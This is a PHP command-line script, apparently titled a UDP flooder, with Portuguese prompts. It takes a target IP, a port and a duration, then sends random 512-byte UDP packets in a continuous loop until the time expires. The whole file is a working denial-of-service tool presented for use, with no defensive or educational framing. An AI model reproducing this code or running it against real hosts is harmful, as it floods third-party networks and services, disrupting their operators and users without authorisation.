<?php 
/******************************
*	Code by Alan Barcellos 	  *
******************************/

error_reporting(0);

abstract class UdpFlooder
{
	private static $rotas = [
		'ip' => [
			'--host' => '-h'
		],
		'port' => [
			'--port' => '-p'
		],
		'limit' => [
			'-t' => '--time'
		]
	];

	private static function Help()
	{
		echo "--host or -h para definir o IP\n";
		echo "--port or -p para definir a porta \n";
		echo "-t or --time para definir o tempo de ataque\n";
		exit();
	}

	public static function Attack()
	{
		global $argv;

		if (count($argv) == 1) 
		{
			self::Help();
		} else 
		{
			$comandos = self::verifyArgs();

			$tempo_definido = time() + $comandos['tempo'];

			for ($i=0; $i < 512; $i++) 
			{ 
				$packet .= chr(mt_rand(1, 256));
			}
			$socket = fsockopen("udp://".$comandos['ip'], $comandos['porta'], $errno, $errstr);
			while (time() < $tempo_definido) 
			{
				fwrite($socket, $packet);
			}
			fclose($socket);
		}
	}

	private static function verifyArgs()
	{
		global $argv;

		foreach ($argv as $key => $value) 
		{
			foreach (self::$rotas['ip'] as $key1 => $value1) 
			{
				if ($key1 == $value or $value1 == $value) 
				{
					$ip = (isset($argv[$key+1]) and substr_count($argv[$key+1], '.') == 3 and self::validaIP($argv[$key+1]) == true) ? $argv[$key+1] : null;					
				}
			}
			foreach (self::$rotas['port'] as $key2 => $value2) 
			{
				if ($key2 == $value or $value2 == $value) 
				{
					$port = (isset($argv[$key+1]) and is_numeric($argv[$key+1]) and strlen($argv[$key+1]) <= 5 and $argv[$key+1] != 0) ? $argv[$key+1] : null;
				}
			}
			foreach (self::$rotas['limit'] as $key3 => $value3) 
			{
				if ($key3 == $value or $value3 == $value) 
				{
					$limit = (isset($argv[$key+1]) and is_numeric($argv[$key+1]) and $argv[$key+1] > 1) ? $argv[$key+1] : null;
				}
			}
		}
		if (is_null($ip)) 
		{
			echo 'IP inválido';
			exit();

		} else
		{
			if (is_null($port)) 
			{
				echo 'Porta inválida';
				exit();
			} else 
			{
				if (is_null($limit)) 
				{
					echo 'Tempo dado é invalido';
				} else 
				{
					return [
						'ip' => $ip,
						'porta' => $port,
						'tempo' => $limit
					];
				}
			}
		}
	}

	private static function validaIP($ip)
	{
		$ex = explode('.', (string)$ip);

		foreach ($ex as $key => $value) 
		{
			if ($ex[$key] === '' or !is_numeric($ex[$key])) 
			{
				return false;
			}
		}
		return true;
	}
}
UdpFlooder::Attack();
?>